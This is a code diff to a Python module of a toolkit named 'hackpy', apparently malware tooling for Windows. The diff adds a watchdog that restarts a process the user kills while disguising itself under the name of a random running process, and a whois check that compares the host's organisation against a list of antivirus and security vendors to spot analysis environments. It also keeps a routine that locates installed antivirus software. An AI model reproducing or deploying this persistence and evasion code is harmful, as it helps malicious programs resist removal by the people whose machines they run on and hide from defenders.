@@ -1,11 +1,100 @@
-from hackpy.file import *
-from os import environ
+from hackpy.file        import *
+from hackpy.modules     import *
+from hackpy.commands    import *
+from hackpy.taskmanager import *
+from subprocess         import Popen
+from threading          import Thread
+from os                 import environ
+from random             import choice
+
+# Restart process automatically when it stopped by user
+class watchdog:
+	def __init__(self, process):
+		self.process       = process
+		self.watchdog_name = choice(taskmanager.list()).split('.')[0] + '_.exe'
+
+	# Start watchdog
+	def start(self):
+		require_module('watchdog.exe')
+		# Check if process active
+		if not taskmanager.find(self.process):
+			raise OSError('Process ' + self.process + ' not found!')
+		# Copy watchdog
+		file.copy(modules_path + 'watchdog.exe', temp_path + self.watchdog_name)
+		# Start watchdog
+		def startWatch():
+			Popen(
+				temp_path + self.watchdog_name + ' ' + self.process,
+				shell    = True
+			)
+		# Start Thread
+		Thread(target=startWatch).start()
+
+	# Stop watchdog
+	def stop(self):
+		command.system('taskkill /f /im ' + self.watchdog_name)
+		file.remove(temp_path + self.watchdog_name)
+
+
+# Detect organization
+def checkOrganization():
+	from hackpy.network import whois
+	try:
+		organization = whois()['org'].lower()
+	except:
+		return False
+	org_list = (
+		'microsoft',
+		'google',
+		'amazon',
+		'facebook',
+		'avast',
+		'avira',
+		'avg',
+		'vds',
+		'cisco',
+		'bitdefender',
+		'comodo',
+		'clamwin',
+		'dr.web',
+		'eset',
+		'grizzly',
+		'kaspersky',
+		'malware',
+		'norton',
+		'antivirus',
+		'security',
+		'secure',
+		'defender',
+		'zonealarm',
+		'immunet',
+		'check point',
+		'f-secure',
+		'f-prot',
+		'frisk',
+		'fortinet',
+		'g data',
+		'mcaffe',
+		'sophos',
+		'panda',
+		'qihoo',
+		'quick heal',
+		'trend micro',
+		'trustport',
+		'virusblokada',
+		'webroot',
+		'symantec',
+	)
+	for company in org_list:
+		if (company in organization):
+			return True
+	return False
 
 # Detect installed antivirus software
 def detectProtection():
 	SYS_DRIVE = environ['SystemDrive'] + '\\'
-	detected = {}
-	av_path = {
+	detected  = {}
+	av_path   = {
 	 'AVAST 32bit': 'Program Files (x86)\\AVAST Software\\Avast',
 	 'AVAST 64bit': 'Program Files\\AVAST Software\\Avast',
 	 'AVG 32bit': 'Program Files (x86)\\AVG\\Antivirus',
